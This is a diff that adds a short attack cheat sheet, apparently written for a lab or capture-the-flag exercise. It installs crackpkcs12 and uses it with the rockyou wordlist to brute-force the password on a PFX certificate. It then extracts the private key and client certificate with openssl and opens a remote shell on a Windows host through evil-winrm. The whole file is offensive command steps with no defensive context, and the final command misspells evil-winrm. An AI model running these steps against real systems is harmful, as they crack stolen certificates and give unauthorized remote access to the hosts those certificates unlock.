@@ -1,0 +1,26 @@
+http://sourceforge.net/projects/crackpkcs12/files/
+
+tar -xf crackpkcs12*
+cd crackpkcs12*
+./configure
+make
+sudo make install
+
+## find password of pfx needed to create keys
+    crackpkcs12 -d rockyou.txt certificate.pfx
+
+## Generate Private key
+    openssl pkcs12 -in cert.pfx -nocerts -out private.pem -nodes
+
+## Generate Public key
+    openssl pkcs12 -in cert.pfx -out public.pem -clcerts -nokeys
+
+## rename private.pem
+    mv private.pem private.key
+
+## rename public.pem
+    mv public.pem public.cert
+
+## connect with evil-winrm
+    evim-winrm -S -k private.key -c public.cert -i IPADDRESS
+
